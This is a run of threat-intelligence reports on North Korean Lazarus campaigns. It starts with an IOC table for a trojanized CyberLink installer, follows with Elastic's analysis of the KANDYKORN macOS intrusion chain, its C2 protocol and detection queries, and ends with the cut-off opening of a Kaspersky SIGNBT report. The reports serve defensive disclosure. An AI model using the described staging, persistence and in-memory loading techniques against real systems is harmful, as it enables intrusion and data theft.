Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.
The following YAMLs contain queries that surface activities related to this attack:
•	Uncommon processes
•	Windows installer packages
•	Process entropy
•	Rare process path
•	Device network events with low-count FQDN
Indicators of compromise
The list below provides IOCs observed during our investigation. We encourage our customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems.
Indicator	Type	Description
166d1a6ddcde4e859a89c2c825cd3c8c953a86bfa92b343de7e5bfbfb5afb8be	SHA-256	Trojanized CyberLink installer (LambLoad)
089573b3a1167f387dcdad5e014a5132e998b2c89bff29bcf8b06dd497d4e63d	SHA-256	Second-stage PNG payload
915c2495e03ff7408f11a2a197f23344004c533ff87db4b807cc937f80c217a1 	SHA-256	Decrypted PE from second-stage PNG
hxxps[:]//update.cyberlink[.]com/Retail/Promeo/RDZCMSFY1ELY/CyberLink_Pr omeo_Downloader.exe	URL	CyberLink update URL used to deliver malicious installer
hxxps[:]//update.cyberlink[.]com/Retail/Patch/Promeo/DL/RDZCMSFY1ELY/Cyb erLink_Promeo_Downloader.exe	URL	CyberLink update URL used to deliver malicious installer
hxxps[:]//cldownloader.github[.]io/logo.png	URL	Stage 2 staging URL
hxxps[:]//i.stack.imgur[.]com/NDTUM.png	URL	Stage 2 staging URL
hxxps[:]//www.webville[.]net/images/CL202966126.png	URL	Stage 2 staging URL
hxxps[:]//mantis.jancom[.]pl/bluemantis/image/addon/addin.php	URL	Stage 2 callback URL
hxxps[:]//zeduzeventos.busqueabuse[.]com/wpadmin/js/widgets/sub/wids.php	URL	Stage 2 callback url





1 NOVEMBER 2023•COLSON WILHOIT•RICARDO UNGUREANU•SETH GOODWIN•ANDREW PEASE
Elastic catches DPRK passing out KANDYKORN
Elastic Security Labs exposes an attempt by the DPRK to infect blockchain engineers with novel macOS malware.
30 min readMalware analysis,Attack pattern,Activity group
 
Preamble
Elastic Security Labs is disclosing a novel intrusion targeting blockchain engineers of a crypto exchange platform. The intrusion leveraged a combination of custom and open source capabilities for initial access and post-exploitation.
We discovered this intrusion when analyzing attempts to reflectively load a binary into memory on a macOS endpoint. The intrusion was traced to a Python application posing as a cryptocurrency arbitrage bot delivered via a direct message on a public Discord server.
We attribute this activity to DPRK and recognize overlaps with the Lazarus Group based on our analysis of the techniques, network infrastructure, code-signing certificates, and custom Lazarus Group detection rules; we track this intrusion set as REF7001.
Key takeaways
•	Threat actors lured blockchain engineers with a Python application to gain initial access to the environment
•	This intrusion involved multiple complex stages that each employed deliberate defense evasion techniques
•	The intrusion set was observed on a macOS system where an adversary attempted to load binaries into memory, which is atypical of macOS intrusions
Execution flow
 REF7001 Execution Flow
Attackers impersonated blockchain engineering community members on a public Discord frequented by members of this community. The attacker social-engineered their initial victim, convincing them to download and decompress a ZIP archive containing malicious code. The victim believed they were installing an arbitrage bot, a software tool capable of profiting from cryptocurrency rate differences between platforms.
This execution kicked off the primary malware execution flow of the REF7001 intrusion, culminating in KANDYKORN:
•	Stage 0 (Initial Compromise) - Watcher.py
•	Stage 1 (Dropper) - testSpeed.py and FinderTools
•	Stage 2 (Payload) - .sld and .log - SUGARLOADER
•	Stage 3 (Loader)- Discord (fake) - HLOADER
•	Stage 4 (Payload) - KANDYKORN
Stage 0 Initial compromise: Watcher.py
The initial breach was orchestrated via a camouflaged Python application designed and advertised as an arbitrage bot targeted at blockchain engineers. This application was distributed as a .zip file titled Cross-Platform Bridges.zip. Decompressing it reveals a Main.py script accompanied by a folder named order_book_recorder, housing 13 Python scripts.
 Cross-Platform Bridges.zip folder structure
The victim manually ran the Main.py script via their PyCharm IDE Python interpreter.
Initially, the Main.py script appears benign. It imports the accompanying Python scripts as modules and seems to execute some mundane functions.
While analyzing the modules housed in the order_book_recorder folder, one file -- Watcher.py -- clearly stood out and we will see why.
Main.py acts as the initial trigger, importing Watcher.py as a module that indirectly executes the script. The Python interpreter runs every top-level statement in Watcher.py sequentially.
The script starts off by establishing local directory paths and subsequently attempts to generate a _log folder at the specified location. If the folder already exists, the script remains passive.
 Creating a folder within the Python application directory structure and name it _log
The script pre-defines a testSpeed.py file path (destined for the just created _log folder) and assigns it to the output variable. The function import_networklib is then defined. Within it, a Google Drive URL is initialized.
Utilizing the Python urllib library, the script fetches content from this URL and stashes it in the s_args variable. In case of retrieval errors, it defaults to returning the operating system's name. Subsequently, the content from Google Drive (now in s_args) is written into the testSpeed.py file.
 Malicious downloader function import_networklib
 Connect to Google Drive url and download data saved to a variable s_args
 Write data from s_args to testSpeed.py file in newly created _log directory
The next function, get_modules_base_version, probes the Python version and invokes the import_networklib function if it detects version 3. This call sets the entire sequence in motion.
 Check if Python version 3, calls the import_networklib function
Watcher.py imports testSpeed.py as a module, executing the contents of the script.
 Import testSpeed.py to execute it
Concluding its operation, the malicious script tidies up, deleting the testSpeed.py file immediately after its one-time execution.
 Delete the downloaded testSpeed.py file following its import and execution
 Watcher.py deletes the testSpeed.py immediately following its execution
Stage 1 droppers testSpeed.py and FinderTools
When executed, testSpeed.py establishes an outbound network connection and fetches another Python file from a Google Drive URL, named FinderTools. This new file is saved to the /Users/Shared/ directory, with the method of retrieval mirroring the Watcher.py script.
 testSpeed.py network connection
 _FinderTools file creation _
After download, testSpeed.py launches FinderTools, providing a URL (tp-globa[.]xyz//OdhLca1mLUp/lZ5rZPxWsh/7yZKYQI43S/fP7savDX6c/bfC) as an argument which initiates an outbound network connection.
 FinderTools execution
 FinderTools network connections
FinderTools is yet another dropper, downloading and executing a hidden second stage payload .sld also written to the /Users/Shared/ directory.
 FinderTools executes .sld
Stage 2 payload .sld and .log: SUGARLOADER
Stage 2 involves the execution of an obfuscated binary we have named SUGARLOADER, which is utilized twice under two separate names (.sld and .log).
SUGARLOADER is first observed at /Users/shared/.sld. The second instance of SUGARLOADER, renamed to .log, is used in the persistence mechanism REF7001 implements with Discord.
Obfuscation
SUGARLOADER is used for initial access on the machine, and initializing the environment for the final stage. This binary is obfuscated using a binary packer, limiting what can be seen with static analysis.
The start function of this binary consists of a jump (JMP) to an undefined address. This is common for binary packers.
HEADER:00000001000042D6 start:
HEADER:00000001000042D6                 jmp     0x10000681E
Executing the macOS file object tool otool -l ./log lists all the sections that will be loaded at runtime.
Section
  sectname __mod_init_func
   segname lko2
      addr 0x00000001006983f0
      size 0x0000000000000008
    offset 4572144
     align 2^3 (8)
    reloff 0
    nreloc 0
     flags 0x00000009
 reserved1 0
 reserved2 0
__mod_init_func contains initialization functions. The C++ compiler places static constructors here. This is the code used to unpack the binary in memory.
A successful method of reverse engineering such files is to place a breakpoint right after the execution of initialization functions and then take a snapshot of the process's virtual memory. When the breakpoint is hit, the code will already be decrypted in memory and can be analyzed using traditional methods.
Adversaries commonly use obfuscation techniques such as this to bypass traditional static signature-based antimalware capabilities. As of this publication, VirusTotal shows 0 detections of this file, which suggests these defense evasions continue to be cost-effective.
 SUGARLOADER VirusTotal Detections
Execution
The primary purpose of SUGARLOADER is to connect to a Command and Control server (C2), in order to download a final stage payload we refer to as KANDYKORN, and execute it directly in memory.
SUGARLOADER checks for the existence of a configuration file at /Library/Caches/com.apple.safari.ck. If the configuration file is missing, it will be downloaded and created via a default C2 address provided as a command line argument to the .sld binary. In our sample, the C2 address was 23.254.226[.]90 over TCP port 443. We provide additional information about the C2 in the Network Infrastructure section below.
 SUGARLOADER C2 established and configuration file download
 SUGARLOADER writing configuration file
The configuration file is encrypted using RC4 and the encryption key (in the Observations section) is hardcoded within SUGARLOADER itself. The com.apple.safari.ck file is utilized by both SUGARLOADER and KANDYKORN for establishing secure network communications.
struct MalwareConfig
{
  char computerId[8];
  _BYTE gap0[12];
  Url c2_urls[2];
  Hostname c2_ip_address[2];
  _BYTE proxy[200];
  int sleepInterval;
};
computerId is a randomly generated string identifying the victim’s computer.
A C2 server can either be identified with a fully qualified URL (c2_urls) or with an IP address and port (c2_ip_ddress). It supports two C2 servers, one as the main server, and the second one as a fallback. The specification or hardcoding of multiple servers like this is commonly used by malicious actors to ensure their connection with the victim is persistent should the original C2 be taken down or blocked. sleepInterval is the default sleeping interval for the malware between separate actions.
Once the configuration file is read into memory and decrypted, the next step is to initialize a connection to the remote server. All the communication between the victim’s computer and the C2 server is detailed in the Network Protocol section.
The last step taken by SUGARLOADER is to download a final stage payload from the C2 server and execute it. REF7001 takes advantage of a technique known as reflective binary loading (allocation followed by the execution of payloads directly within the memory of the process) to execute the final stage, leveraging APIs such as NSCreateObjectFileImageFromMemory or NSLinkModule. Reflective loading is a powerful technique. If you'd like to learn more about how it works, check out this research by slyd0g and hackd.
This technique can be utilized to execute a payload from an in-memory buffer. Fileless execution such as this has been observed previously in attacks conducted by the Lazarus Group.
SUGARLOADER reflectively loads a binary (KANDYKORN) and then creates a new file initially named appname which we refer to as HLOADER which we took directly from the process code signature’s signing identifier.
 SUGARLOADER reflective binary load alert
 SUGARLOADER creates HLOADER
 HLOADER code signature identifier
 Pseudocode for SUGARLOADER (stage2)
Stage 3 loader Discord: HLOADER
HLOADER (2360a69e5fd7217e977123c81d3dbb60bf4763a9dae6949bc1900234f7762df1) is a payload that attempts to masquerade as the legitimate Discord application. As of this writing, it has 0 detections on VirusTotal.
 HLOADER VirusTotal Detections
HLOADER was identified through the use of a macOS binary code-signing technique that has been previously linked to the DPRK’s Lazarus Group 3CX intrusion. In addition to other published research, Elastic Security Labs has also used the presence of this technique as an indicator of DPRK campaigns, as seen in our June 2023 research publication on JOKERSPY.
Persistence
We observed the threat actor adopting a technique we have not previously seen them use to achieve persistence on macOS, known as execution flow hijacking. The target of this attack was the widely used application Discord. The Discord application is often configured by users as a login item and launched when the system boots, making it an attractive target for takeover. HLOADER is a self-signed binary written in Swift. The purpose of this loader is to execute both the legitimate Discord bundle and .log payload, the latter of which is used to execute Mach-O binary files from memory without writing them to disk.
The legitimate binary /Applications/Discord.app/Contents/MacOS/Discord was renamed to .lock, and replaced by HLOADER.
 Discord replaced by HLOADER
Below is the code signature information for HLOADER, which has a self-signed identifier structure consistent with other Lazarus Group samples.
Executable=Applications/Discord.app/Contents/MacOS/Discord
Identifier=HLOADER-5555494485b460f1e2343dffaef9b94d01136320
Format=bundle with Mach-O universal (x86_64 arm64)
CodeDirectory flags=0x2(adhoc) hashes=12+7 location=embedded
When executed, HLOADER performs the following operations:
•	Renames itself from Discord to MacOS.tmp
•	Renames the legitimate Discord binary from .lock to Discord
•	Executes both Discord and .log using NSTask.launchAndReturnError
•	Renames both files back to their initial names
 HLOADER execution event chain
 HLOADER Discord Application Hijack
The following process tree also visually depicts how persistence is obtained. The root node Discord is actually HLOADER disguised as the legitimate app. As presented above, it first runs .lock, which is in fact Discord, and, alongside, spawns SUGARLOADER as a process named .log.
 Process Tree Analyzer
As seen in stage 2, SUGARLOADER reads the configuration file, connects to the C2 server, and waits for a payload to be received. Another alert is generated when the new payload (KANDYKORN) is loaded into memory.
 Reflective Dylib Load Alert for KANDYKORN
Stage 4 Payload: KANDYKORN
KANDYKORN is the final stage of this execution chain and possesses a full-featured set of capabilities to access and exfiltrate data from the victim’s computer. Elastic Security Labs was able to retrieve this payload from one C2 server which hadn’t been deactivated yet.
Execution
KANDYCORN processes are forked and run in the background as daemons before loading their configuration file from /Library/Caches/com.apple.safari.ck. The configuration file is read into memory then decrypted using the same RC4 key, and parsed for C2 settings. The communication protocol is similar to prior stages using the victim ID value for authentication.
Command and control
Once communication is established, KANDYKORN awaits commands from the server. This is an interesting characteristic in that the malware waits for commands instead of polling for commands. This would reduce the number of endpoint and network artifacts generated and provide a way to limit potential discovery.
Each command is represented by an integer being transmitted, followed by the data that is specific to each action. Below is a list of the available commands KANDYKORN provides.
Command 0xD1
Action: Exit command where the program gracefully exists.
Command 0xD2
Name: resp_basicinfo Action: Gathers information about the system such as hostname, uid, osinfo, and image path of the current process, and reports back to the server.
 resp_basicinfo routine
Command 0xD3
Name: resp_file_dir Action: Lists content of a directory and format the output similar to ls -al, including type, name, permissions, size, acl, path, and access time.
 resp_file_dir routine
Command 0xD4
Name: resp_file_prop
Action: Recursively read a directory and count the number of files, number of subdirectories, and total size.
 resp_file_prop routine
Command 0xD5
Name: resp_file_upload
Action: Used by the adversary to upload a file from their C2 server to the victim’s computer. This command specifies a path, creates it, and then proceeds to download the file content and write it to the victim’s computer.
Command 0xD6
Name: resp_file_down
Action: Used by the adversary to transfer a file from the victim’s computer to their infrastructure.
Command 0xD7
Name: resp_file_zipdown
Action: Archive a directory and exfiltrate it to the C2 server. The newly created archive’s name has the following pattern/tmp/tempXXXXXXX.
 _resp_file_zipdown routine _
Command 0xD8
Name: resp_file_wipe Action: Overwrites file content to zero and deletes the file. This is a common technique used to impede recovering the file through digital forensics on the filesystem.
 resp_file_wipe routine
Command 0xD9
Name: resp_proc_list
Action: Lists all running processes on the system along with their PID, UID and other information.
Command 0xDA
Name: resp_proc_kill
Action: Kills a process by specified PID.
 resp_proc_kill routine
Command 0xDB
Name: resp_cmd_send
Action: Executes a command on the system by using a pseudoterminal.
Command 0xDC
Name: resp_cmd_recv
Action: Reads the command output from the previous command resp_cmd_send.
Command 0xDD
Name: resp_cmd_create
Action: Spawns a shell on the system and communicates with it via a pseudoterminal. Once the shell process is executed, commands are read and written through the /dev/pts device.
 resp_cmd_create routine (interactive shell)
Command 0xDE
Name: resp_cfg_get
Action: Sends the current configuration to the C2 from /Library/Caches/com.apple.safari.ck.
Command 0xDF
Name: resp_cfg_set
Action: Download a new configuration file to the victim’s machine. This is used by the adversary to update the C2 hostname that should be used to retrieve commands from.
Command 0xE0
Name: resp_sleep
Action: Sleeps for a number of seconds.
Summary
KANDYKORN is an advanced implant with a variety of capabilities to monitor, interact with, and avoid detection. It utilizes reflective loading, a direct-memory form of execution that may bypass detections.
Network protocol
All the executables that communicate with the C2 (both stage 3 and stage 4) are using the same protocol. All the data is encrypted with RC4 and uses the same key previously referenced in the configuration file.
Both samples implement wrappers around the send-and-receive system calls. It can be observed in the following pseudocode that during the send routine, the buffer is first encrypted and then sent to the socket, whereas when data is received it is first decrypted and then processed.
 send routine
 recv routine
When the malware first connects to the C2 during the initialization phase, there is a handshake that needs to be validated in order to proceed. Should the handshake fail, the attack would stop and no other commands would be processed.
On the client side, a random number is generated and sent to the C2, which replies with a nonce variable. The client then computes a challenge with the random number and the received nonce and sends the result back to the server. If the challenge is successful and the server accepts the connection, it replies with a constant such as 0x41C3372 which appears in the analyzed sample.
 Handshake routine
Once the connection is established, the client sends its ID and awaits commands from the server. Any subsequent data sent or received from here is serialized following a common schema used to serialize binary objects. First, the length of the content is sent, then the payload, followed by a return code which indicates if any error occurred.
 Overview of communication protocol
Network infrastructure
During REF7001, the adversary was observed communicating with network infrastructure to collect various payloads and loaders for different stages of the intrusion.
As detailed in the Stage 1 section above, the link to the initial malware archive, Cross-Platform Bridges.zip, was provided in a direct message on a popular blockchain Discord server. This archive was hosted on a Google Drive (https://drive.google[.]com/file/d1KW5nQ8MZccug6Mp4QtKyWLT3HIZzHNIL2), but this was removed shortly after the archive was downloaded.
Throughout the analysis of the REF7001 intrusion, there were two C2 servers observed.
•	tp-globa[.]xyz//OdhLca1mLUp/lZ5rZPxWsh/7yZKYQI43S/fP7savDX6c/bfC
•	23.254.226[.]90
tp-globa[.]xyz
The C2 domain tp-globa[.]xyz is used by FinderTools to download SUGARLOADER and is likely an attempt at typosquatting a legitimate foreign exchange market broker. We do not have any information to indicate that the legitimate company is involved in this intrusion. This typosquatted domain was likely chosen in an attempt to appear more legitimate to the victims of the intrusion.
tp-globa[.]xyz, as of this writing, resolves to an IP address (192.119.64[.]43) that has been observed distributing malware attributed to the DPRK’s Lazarus Group (1, 2, 3).
23.254.226[.]90
23.254.226[.]90 is the C2 IP used for the .sld file (SUGARLOADER malware). How this IP is used for C2 is highlighted in the stage 2 section above.
On October 14, 2023, 23.254.226[.]90 was used to register the subdomain, pesnam.publicvm[.]com. While we did not observe this domain in our intrusion, it is documented as hosting other malicious software.
Campaign intersections
tp-globa[.]xyz, has a TLS certificate with a Subject CN of bitscrunnch.linkpc[.]net. The domain bitscrunnch.linkpc[.]net has been attributed to other Lazarus Group intrusions.
As noted above, this is likely an attempt to typosquat a legitimate domain for a decentralized NFT data platform. We do not have any information to indicate that the legitimate company is involved in this intrusion.
…
Issuer: C = US, O = Let's Encrypt, CN = R3
Validity
Not Before: Sep 20 12:55:37 2023 GMT
Not After : Dec 19 12:55:36 2023 GMT
Subject: CN = bitscrunnch[.]linkpc[.]net
…
The bitscrunnch.linkpc[.]net’s TLS certificate is also used for other additional domains, all of which are registered to the same IP address reported above in the tp-globa[.]xyz section above, 192.119.64[.]43.
•	jobintro.linkpc[.]net
•	jobdescription.linkpc[.]net
•	docsenddata.linkpc[.]net
•	docsendinfo.linkpc[.]net
•	datasend.linkpc[.]net
•	exodus.linkpc[.]net
•	bitscrunnch.run[.]place
•	coupang-networks[.]pics
While LinkPC is a legitimate second-level domain and dynamic DNS service provider, it is well-documented that this specific service is used by threat actors for C2. In our published research into RUSTBUCKET, which is also attributed to the DPRK, we observed LinkPC being used for C2.
All registered domains, 48 as of this writing, for 192.119.64[.]43 are included in the observables bundle.
Finally, in late July 2023, there were reports on the Subreddits r/hacking, r/Malware, and r/pihole with URLs that matched the structure of tp-globa[.]xyz//OdhLca1mLUp/lZ5rZPxWsh/7yZKYQI43S/fP7savDX6c/bfC. The user on Reddit reported that a recruiter contacted them to solve a Python coding challenge as part of a job offer. The code challenge was to analyze Python code purported to be for an internet speed test. This aligns with the REF7001 victim’s reporting on being offered a Python coding challenge and the script name testSpeed.py detailed earlier in this research.
The domain reported on Reddit was group.pro-tokyo[.]top//OcRLY4xsFlN/vMZrXIWONw/6OyCZl89HS/fP7savDX6c/bfC which follows the same structure as the REF7001 URL (tp-globa[.]xyz//OdhLca1mLUp/lZ5rZPxWsh/7yZKYQI43S/fP7savDX6c/bfC):
•	Two //’s after the TLD
•	5 subdirectories using an //11-characters/10-characters/10-characters/ structure
•	The last 2 subdirectories were /fP7savDX6c/bfC
While we did not observe GitHub in our intrusion, the Redditors who reported this did observe GitHub profiles being used. They have all been deactivated.
Those accounts were:
•	https://github[.]com/Prtof
•	https://github[.]com/wokurks
Summary
The DPRK, via units like the LAZARUS GROUP, continues to target crypto-industry businesses with the goal of stealing cryptocurrency in order to circumvent international sanctions that hinder the growth of their economy and ambitions. In this intrusion, they targeted blockchain engineers active on a public chat server with a lure designed to speak to their skills and interests, with the underlying promise of financial gain.
The infection required interactivity from the victim that would still be expected had the lure been legitimate. Once executed, via a Python interpreter, the REF7001 execution flow went through 5 stages:
•	Stage 0 (staging) - Main.py executes Watcher.py as an imported module. This script checks the Python version, prepares the local system directories, then downloads, executes, and cleans up the next stage.
•	Stage 1 (generic droppers) - testSpeed.py and FinderTools are intermediate dropper Python scripts that download and execute SUGARLOADER.
•	Stage 2 (SUGARLOADER) - .sld and .log are Mach-O executable payloads that establish C2, write the configuration file and reflectively load KANDYKORN.
•	Stage 3 (HLOADER) - HLOADER/Discord(fake) is a simple loader used as a persistence mechanism masquerading as the legitimate Discord app for the loading of SUGARLOADER.
•	Stage 4 (KANDYKORN) - The final reflectively loaded payload. KANDYKORN is a full-featured memory resident RAT with built-in capabilities to:
•	Conduct encrypted command and control
•	Conduct system enumeration
•	Upload and execute additional payloads
•	Compress and exfil data
•	Kill processes
•	Run arbitrary system commands through an interactive pseudoterminal
Elastic traced this campaign to April 2023 through the RC4 key used to encrypt the SUGARLOADER and KANDYKORN C2. This threat is still active and the tools and techniques are being continuously developed.
The Diamond Model
Elastic Security utilizes the Diamond Model to describe high-level relationships between adversaries, capabilities, infrastructure, and victims of intrusions. While the Diamond Model is most commonly used with single intrusions, and leveraging Activity Threading (section 8) as a way to create relationships between incidents, an adversary-centered (section 7.1.4) approach allows for an, although cluttered, single diamond.
 REF7001 Diamond Model
[Malware] and MITRE ATT&CK
Elastic uses the MITRE ATT&CK framework to document common tactics, techniques, and procedures that advanced persistent threats used against enterprise networks.
Tactics
Tactics represent the why of a technique or sub-technique. It is the adversary’s tactical goal: the reason for performing an action.
•	Execution
•	Persistence
•	Defense Evasion
•	Discovery
•	Collection
•	Command and Control
•	Exfiltration
Techniques
Techniques represent how an adversary achieves a tactical goal by performing an action.
•	User Execution: Malicious File
•	Command and Scripting Interpreter: Python
•	Command and Scripting Interpreter: Unix Shell
•	Hijack Execution Flow
•	Deobfuscate/Decode Files or Information
•	Hide Artifacts: Hidden Files and Directories
•	Indicator Removal: File Deletion
•	Masquerading: Match Legitimate Name or Location
•	Obfuscated Files or Information: Software Packing
•	Reflective Code Loading
•	File and Directory Discovery
•	Process Discovery
•	System Information Discovery
•	Archive Collected Data: Archive via Custom Method
•	Local Data Staging
•	Application Layer Protocol: Web Protocols
•	Fallback Channels
•	Ingress Tool Transfer
•	Exfiltration Over C2 Channel
Malware prevention capabilities
•	MacOS.Trojan.SUGARLOADER
•	MacOS.Trojan.HLOADER
•	MacOS.Trojan.KANDYKORN
Malware detection capabilities
Hunting queries
The events for EQL are provided with the Elastic Agent using the Elastic Defend integration. Hunting queries could return high signals or false positives. These queries are used to identify potentially suspicious behavior, but an investigation is required to validate the findings.
EQL queries
Using the Timeline section of the Security Solution in Kibana under the “Correlation” tab, you can use the below EQL queries to hunt for similar behaviors.
The following EQL query can be used to identify when a hidden executable creates and then immediately deletes a file within a temporary directory:
sequence by process.entity_id, file.path with maxspan=30s
  [file where event.action == "modification" and process.name : ".*" and 
   file.path : ("/private/tmp/*", "/tmp/*", "/var/tmp/*")]
  [file where event.action == "deletion" and process.name : ".*" and 
   file.path : ("/private/tmp/*", "/tmp/*", "/var/tmp/*")]
The following EQL query can be used to identify when a hidden file makes an outbound network connection followed by the immediate download of an executable file:
sequence by process.entity_id with maxspan=30s
[network where event.type == "start" and process.name : ".*"]
[file where event.action != "deletion" and file.Ext.header_bytes : ("cffaedfe*", "cafebabe*")]
The following EQL query can be used to identify when a macOS application binary gets renamed to a hidden file name within the same directory:
file where event.action == "rename" and file.name : ".*" and 
 file.path : "/Applications/*/Contents/MacOS/*" and 
 file.Ext.original.path : "/Applications/*/Contents/MacOS/*" and 
 not startswith~(file.Ext.original.path,Effective_process.executable)
The following EQL query can be used to identify when an IP address is supplied as an argument to a hidden executable:
sequence by process.entity_id with maxspan=30s
[process where event.type == "start" and event.action == "exec" and process.name : ".*" and process.args regex~ "[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}"]
[network where event.type == "start"]
The following EQL query can be used to identify the rename or modification of a hidden executable file within the /Users/Shared directory or the execution of a hidden unsigned or untrusted process in the /Users/Shared directory:
any where 
 (
  (event.category : "file" and event.action != "deletion" and file.Ext.header_bytes : ("cffaedfe*", "cafebabe*") and 
   file.path : "/Users/Shared/*" and file.name : ".*" ) or 
  (event.category : "process" and event.action == "exec" and process.executable : "/Users/Shared/*" and 
   (process.code_signature.trusted == false or process.code_signature.exists == false) and process.name : ".*")
 )
The following EQL query can be used to identify when a URL is supplied as an argument to a python script via the command line:
sequence by process.entity_id with maxspan=30s
[process where event.type == "start" and event.action == "exec" and 
 process.args : "python*" and process.args : ("/Users/*", "/tmp/*", "/var/tmp/*", "/private/tmp/*") and process.args : "http*" and 
 process.args_count <= 3 and 
 not process.name : ("curl", "wget")]
[network where event.type == "start"]
The following EQL query can be used to identify the attempt of in memory Mach-O loading specifically by looking for the predictable temporary file creation of "NSCreateObjectFileImageFromMemory-*":
file where event.type != "deletion" and 
file.name : "NSCreateObjectFileImageFromMemory-*"
The following EQL query can be used to identify the attempt of in memory Mach-O loading by looking for the load of the "NSCreateObjectFileImageFromMemory-*" file or a load with no dylib name provided:
any where ((event.action == "load" and not dll.path : "?*") or 
  (event.action == "load" and dll.name : "NSCreateObjectFileImageFromMemory*"))
YARA
Elastic Security has created YARA rules to identify this activity. Below are YARA rules to identify the payloads:
•	MacOS.Trojan.SUGARLOADER
•	MacOS.Trojan.HLOADER
•	MacOS.Trojan.KANDYKORN
Observations
All observables are also available for download in both ECS and STIX format.
The following observables were discussed in this research.
Observable	Type	Name	Reference
3ea2ead8f3cec030906dcbffe3efd5c5d77d5d375d4a54cca03bfe8a6cb59940	SHA-256	.log, .sld	SUGARLOADER
2360a69e5fd7217e977123c81d3dbb60bf4763a9dae6949bc1900234f7762df1	SHA-256	Discord (fake)	HLOADER
927b3564c1cf884d2a05e1d7bd24362ce8563a1e9b85be776190ab7f8af192f6	SHA-256		KANDYKORN
http://tp-globa[.]xyz//OdhLca1mLUp/lZ5rZPxWsh/7yZKYQI43S/fP7savDX6c/bfC	url		FinderTools C2 URL
tp-globa[.]xyz	domain-name		FinderTools C2 domain
192.119.64[.]43	ipv4-addr	tp-globa IP address	FinderTools C2 IP
23.254.226[.]90	ipv4-addr		SUGARLOADER C2 IP
D9F936CE628C3E5D9B3695694D1CDE79E470E938064D98FBF4EF980A5558D1C90C7E650C2362A21B914ABD173ABA5C0E5837C47B89F74C5B23A7294CC1CFD11B	64 byte key	RC4 key	SUGARLOADER, KANDYKORN








A cascade of compromise: unveiling Lazarus’ new campaign
APT REPORTS
27 OCT 2023
 9 minute read
 
AUTHORS
•	 SEONGSU PARK
Earlier this year, a software vendor was compromised by the Lazarus malware delivered through unpatched legitimate software. What’s remarkable is that these software vulnerabilities were not new, and despite warnings and patches from the vendor, many of the vendor’s systems continued to use the flawed software, allowing the threat actor to exploit them. Fortunately, a proactive response by us detected an attack on another vendor and effectively thwarted the attacker’s efforts.
Upon further investigation, we discovered that the software vendor that developed the exploited software had previously fallen victim to Lazarus several times. This recurring breach suggested a persistent and determined threat actor with the likely objective of stealing valuable source code or tampering with the software supply chain, and they continued to exploit vulnerabilities in the company’s software while targeting other software makers.
 
Infection timeline
The adversary demonstrated a high level of sophistication, employing advanced evasion techniques and introducing SIGNBT malware for victim control. In addition, other malware found in memory included Lazarus’ prominent LPEClient, a tool known for victim profiling and payload delivery that has previously been observed in attacks on defense contractors and the cryptocurrency industry.
Executive summary:
•	A software vendor was compromised through the exploitation of another high-profile software.
•	The SIGNBT malware used in this attack employed a diverse infection chain and sophisticated techniques.
•	LPEClient used in this attack was observed executing a range of targeted attacks associated with the Lazarus group.
For more information, please contact: intelreports@kaspersky.com
SIGNBT loader
In mid-July 2023, we detected a series of attacks on several victims who had been targeted through legitimate security software designed to encrypt web communications using digital certificates. The exact method by which this software was exploited to deliver the malware remains elusive. However, we identified post-exploitation activity within the processes of the legitimate software. In one instance, while examining the memory of the compromised security software from a victim’s system, we discovered the presence of the SIGNBT malware accompanied by a shellcode. This shellcode was responsible for launching a Windows executable file directly in memory.
The actor uses various tactics to establish and maintain persistence on compromised systems. These include the creation of a file called ualapi.dll in the system folder, which is automatically loaded by the spoolsv.exe process at each system boot. Additionally, in several instances, registry entries were recorded to execute legitimate files for the purpose of malicious side-loading, further ensuring a resilient persistence mechanism.
 
Methods for loading the final payload
Leveraging the spoolsv.exe process for hijacking purposes is a long-standing strategy for Lazarus. Automatically loading the ualapi.dll file after each reboot is not a new technique for this actor. We have seen similar tactics used by the Gopuram malware in the past.
The malicious ualapi.dll file was developed using a public source code known as Shareaza Torrent Wizard. It follows a typical Lazarus group approach of utilizing public source code as a foundation and injecting specific malicious functions into it. This loader malware has a routine to verify the victim. It retrieves the victim’s MachineGuid by reading it from the Windows registry and then compares it with an embedded MachineGuid value. To access this embedded MachineGuid value, the malware locates the sequence “43 EB 8C BD 1D 98 3D 14” and reads the DWORD immediately following it. Only if the victim’s MachineGuid matches the expected one does the malware proceed to the next step. The malware then reads the payload from a hard-coded file path and continues its malicious activities.
•	Payload path: C:\Windows\system32\config\systemprofile\appdata\Local\tw-100a-a00-e14d9.tmp
The loader process retrieves the first 32 bytes from tw-100a-a00-e14d9.tmp and uses this data as an AES decryption key to decrypt the remaining contents. Once decrypted, the payload, a Windows executable identified as SIGNBT, is loaded directly into memory. In this case, the loaded payload also reads the configuration file from the same path, but with a slightly different file name.
•	Config file: C:\Windows\system32\config\systemprofile\appdata\Local\tw-100b-a00-e14d9.tmp
Inside this file is a base64-encoded string, mirroring the approach used in the previous SIGNBT malware method. The first 32 characters of this string serve as the AES decryption key, while the subsequent data contains configuration information used by the malware. This decrypted configuration data includes details such as three C2 addresses, which are referred to as proxies, sleep intervals, version information, monitored targets, and various other parameters critical to the malware’s operation.
SIGNBT
The majority of SIGNBT malware instances are launched through the malware loader, which operates exclusively in memory. Upon execution, the malware begins communicating with the C2 server by sending a beacon after initialization of its configuration data. In its C2 communication, the malware uses distinctive strings that start with SIGNBT. This unique characteristic has earned it the designation of SIGNBT. In addition, the malware uses different prefixes at each stage of its C2 operation to verify and maintain its activities.
Prefix name	Description
SIGNBTLG	Initial connection.
SIGNBTKE	Success – update the key and ask for a profiling process.
SIGNBTGC	Ask for commands.
SIGNBTFI	Operation failed.
SIGNBTSR	Operation success.
The malware employs a multi-step process to create a 24-byte value for various purposes. First, it generates this value with the following components:
1.	8 bytes of hard-coded value (SIGNBTLG): this is a fixed part of the value and serves to validate the legitimacy of the client’s connection.
2.	8 bytes from the MD5 hash of the hostname: the first 8 bytes of the MD5 hash of the victim’s computer name are included, helping to distinguishing each victim.
3.	8 bytes of randomly generated identifier: another 8 bytes are randomly generated, probably used for session identifiers.
